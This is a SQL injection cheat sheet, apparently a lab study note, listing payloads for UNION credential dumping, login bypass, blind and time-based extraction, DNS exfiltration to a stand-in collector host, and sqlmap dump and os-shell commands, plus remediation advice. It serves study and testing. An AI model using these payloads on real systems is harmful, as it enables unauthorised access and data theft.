# SQL Injection

Unsanitised input reaches a SQL query and changes its **logic or structure** rather than just its values. What that is worth depends entirely on one thing: how the answer gets back to you. That question splits the whole technique into four classes, and picking the wrong one is what turns a confirmed injection into an afternoon of payloads that cannot possibly work.

- **In-band** — the result comes back in the page. Error-based and UNION-based. Fastest.
- **Blind, boolean** — no output, but the page differs between true and false. One bit per request.
- **Blind, time-based** — no output and no visible difference. A conditional delay is the only channel. One bit per request, slowly.
- **Out-of-band** — nothing in the response at all; the database server itself makes a network request to you.

Work down that list. Each class is slower than the one above it, and each needs a different confirmation before it is worth spending time on.

## Find the injection point and its class

```text
'
"
1'
1 AND 1=1--
1 AND 1=2--
1' AND '1'='1
1' AND '1'='2
```

- a bare `'` first → the cheapest possible probe. If it errors, the quoting is broken and you are in, with the error text likely naming the engine
- `AND 1=1` versus `AND 1=2` → the pair that identifies **boolean** blind injection. Identical responses mean your condition changed nothing; a different response between them means the database evaluated your logic, which is a confirmed injection even with no output and no error
- send them as a **pair**, always → a single request tells you what a page looks like, never whether it changed. Sending only `1=1` and seeing a normal page proves nothing at all
- `-- -` everywhere in this note → MySQL's `--` comment needs whitespace after it, and a payload written with a bare trailing space loses it to copy-paste and to URL handling. `-- -` survives both and means the same thing; `--+` and `#` are the other safe forms. **This is the most common reason a correct payload does nothing**: the comment marker is not recognised, the tail of the original query is still there, and the statement is invalid
- `1'` versus `1` → tests whether the value is quoted in the query. Numeric context needs no quote and adding one breaks it; string context needs one and omitting it breaks it. Test both
- URL-encode `'` as `%27` and `+` as `%2b` when the payload goes in a query string

- **Found (in-band, error)** — a database error in the response: `You have an error in your SQL syntax`, `unclosed quotation mark after the character string`, `ORA-01756`, `PG::SyntaxError`. Each names the engine, and the engine decides the syntax for everything below.
- **Found (in-band, union)** — no error, but the page content changes in a way that reflects your input. Go to the column-count step.
- **Found (blind, boolean)** — `1=1` and `1=2` render differently: a row appears or does not, a message changes, the response length shifts. No error, no output, and fully exploitable.
- **Error (not the useful kind)** — a 403 with a vendor block page is a [[Security-Terms#^waf|WAF]] recognising the pattern, not the database rejecting it. It arrives fast, looks identical for every payload, and means change encoding rather than change payload. A 500 with no message is the application catching the exception; the injection may still be live.

## Count the columns

```text
1' ORDER BY 1--
1' ORDER BY 2--
1' ORDER BY 3--
1' ORDER BY 4--
```

- `ORDER BY n` → sort by the n-th column. Increment until it errors; the last number that **worked** is the column count. Cheaper than the UNION method because each request is one number rather than a growing list
- the alternative is `' UNION SELECT NULL--`, then `NULL,NULL`, and so on. `NULL` rather than `1` because it is type-compatible with every column, and a type mismatch produces the same error as a count mismatch — which makes the numeric version ambiguous
- error at 4 and success at 3 means three columns. **Off-by-one here poisons everything downstream**, since a wrong count errors identically no matter what you select
- some engines refuse `ORDER BY` in a subquery or a UNION context; fall back to the `NULL` method

## UNION — pull the data into the page

```text
0' UNION SELECT 1,2,3-- -
0' UNION SELECT 1,2,database()-- -
0' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()-- -
0' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'-- -
0' UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM users-- -
```

- `0'` rather than `1'` → force the **original** query to return no rows, so the page shows only your injected row. Leave the real value in place and your data is appended below a page of genuine results, or hidden entirely when the template renders only the first row. This is the single most useful habit in the section
- `SELECT 1,2,3` first → the marker step. Whichever numbers appear on the page are the columns that are actually **rendered**; put your data in one of those and nowhere else. Selecting into a column the template ignores returns a blank page and looks like failure
- `group_concat()` → collapses many rows into one string, because the page usually shows one row. MSSQL has no `group_concat`; use `STRING_AGG` or the `FOR XML PATH` idiom
- `information_schema` → the standard metadata catalogue: `.tables` and `.columns` describe the whole database. MySQL, PostgreSQL and MSSQL all have it; **Oracle does not** (`all_tables`), and [[Security-Terms#^sqlite|SQLite]] has `sqlite_master` instead
- `WHERE table_schema=database()` → restricts to the current database. Without it you get every system table as well and the useful names are buried
- `SEPARATOR '<br>'` → renders one credential per line in HTML instead of a single unreadable run

## Blind — boolean

```text
1' AND (SELECT SUBSTRING(database(),1,1))='a'-- -
1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>3-- -
1' AND (SELECT LENGTH(database()))=6-- -
1' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>77-- -
```

- ask for the **length** first → it bounds the work. Extracting a value of unknown length means you never know when to stop
- `SUBSTRING(x,n,1)` → one character at position `n`. Cycle the comparison character through the plausible alphabet and the true answer is your character
- `ASCII(...)>77` → binary search instead of linear scan. Seven requests per character instead of up to sixty-two, which is the difference between minutes and an hour
- `LIKE 'a%'` → the prefix form the original notes used, and it works the same way: extend the known prefix one character at a time
- a **baseline pair is mandatory** here. Capture the exact true page and the exact false page before extracting anything; without them you cannot read a single answer, and every result is a coin flip you are calling after the fact
- this is where you stop doing it by hand. Confirm the mechanism manually, then let sqlmap perform the thousands of requests

## Blind — authentication bypass

```text
' OR '1'='1'-- -
' OR 1=1 LIMIT 1-- -
admin'-- -
admin'#
' OR '1'='1' /*
```

- `admin'--` → the sharpest version, and the one to try first. It comments out the password check entirely and logs you in as a **named** user rather than as whichever row happens to be first
- `' OR '1'='1` → always true, so every row matches. When the application takes the first row you become whoever that is, which is often but not always the administrator
- `--` needs a trailing space in MySQL; `#` is the safe alternative there, `/*` for engines that want a block comment. **This one character is the difference between a bypass and a syntax error**, and the error is usually invisible because the login just fails
- try the payload in the **username** field, then the password field, then both — they frequently reach different parts of the query

## Blind — time-based

```text
1' AND SLEEP(5)-- -
1'; WAITFOR DELAY '0:0:5'-- -
1' AND (SELECT pg_sleep(5))-- -
1' AND IF(ASCII(SUBSTRING(database(),1,1))>109,SLEEP(5),0)-- -
```

- `SLEEP()` is MySQL, `WAITFOR DELAY` is MSSQL, `pg_sleep()` is PostgreSQL, `dbms_pipe.receive_message()` is Oracle. **Using the wrong one produces no delay and reads as "not vulnerable"** — which is exactly the false negative this section exists to prevent, so identify the engine first or try all four
- time the same request **without** the payload first. A page that normally takes 4 seconds makes a 5-second delay invisible
- vary the delay (3, then 9) and confirm the response time tracks it. One slow response is noise; a response time that follows the number you chose is proof
- `IF(condition, SLEEP(5), 0)` → the extraction form: the delay itself carries one bit of the answer. Correct, and painfully slow, which is why this is where automation stops being optional
- over a [[Security-Terms#^vpn|VPN]], tunnel latency swamps short delays. Use a longer sleep, and drop `T` from sqlmap's `--technique` if it starts producing inconsistent results

## Out-of-band

```text
'; EXEC master..xp_dirtree '\\zz7f31.collector.thm\share'-- -
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.collector.thm\\share'))-- -
' AND (SELECT UTL_INADDR.get_host_address('zz7f31.collector.thm')) IS NOT NULL-- -
```

- two separate channels → the **attack** channel is your normal HTTP request; the **data** channel is the database server's outbound DNS or HTTP request to a host you control. They are different machines and different network paths, which is exactly why this works when everything else does not
- `xp_dirtree` (MSSQL) and `LOAD_FILE` on a [[Security-Terms#^unc|UNC path]] (MySQL on Windows) → both make the host resolve a hostname, and the resolution is the signal
- `CONCAT('\\\\',(SELECT database()),'.collector.thm\\share')` → the data is smuggled into the **subdomain label**, so a single DNS lookup carries the answer
- **DNS labels are capped at 63 characters** and the whole name at 253, so long values must be extracted in chunks. Hex-encode binary data or it will not survive as a hostname
- you must be listening: Burp Collaborator, Interactsh, or your own authoritative DNS. A callback nobody records is a callback that did not happen
- DNS is the more reliable carrier than HTTP, because outbound 53 is permitted far more often than outbound 80 from a database host

## sqlmap — automating what you already confirmed

```bash
sqlmap -r request.txt -p id --batch --level 2 --risk 1 --dbs
```

```bash
sqlmap -r request.txt -p id -D webapp --tables
```

```bash
sqlmap -r request.txt -p id -D webapp -T users --dump
```

- `-r request.txt` → a full HTTP request saved from [[Burp-Suite]]. **The most reliable way to run it**: headers, cookies, body and method all come along, so authenticated and POST-based testing work without further flags. `-u 'http://target.thm/search?cat=1'` handles the simple GET case, and `--cookie='PHPSESSID=...'` bolts a session onto it
- `-p id` → test only this parameter. Without it sqlmap tests everything, which is many times slower and far noisier
- `--batch` → accept the default answer to every prompt. Without it a long run stops halfway waiting for a keypress you are not there to give
- `--level 1-5` → how thorough: higher levels test cookies, headers and more payloads. `--risk 1-3` is how aggressive the payloads are; risk 3 includes `OR`-based payloads that can modify data. Start at `--level 1 --risk 1` and raise only when nothing is found
- `--technique=BEU` → restrict to boolean, error and union. **Drop `T` when working over a VPN**: tunnel latency breaks its timing measurements, and it stalls on delay-calibration prompts
- `--dbs` → `-D` → `--tables` → `-T` → `--dump` is the broad-to-narrow chain, and each step is one more question, not a fresh attack. sqlmap caches the injection point between runs
- `--os-shell` on a privileged database user attempts a shell via `xp_cmdshell` (MSSQL) or `INTO OUTFILE` into the webroot (MySQL)

## Remediation

Worth knowing because it tells you what a hardened target looks like, and therefore when to stop.

- **Parameterised queries / prepared statements** — the primary defence, and the only complete one. The query structure is fixed before user data is bound to it, so no input can change it.
- **Input validation** — whitelist the characters a field can contain. A useful second layer and not a substitute for the first.
- **Least-privilege database accounts** — limits what a successful injection reaches. This is why `--os-shell` fails on well-configured targets even when injection works.
- **Errors suppressed in production** — costs you the error-based channel and nothing else. It makes injection harder to find, not harder to exploit, which is exactly why the time-based probe exists.
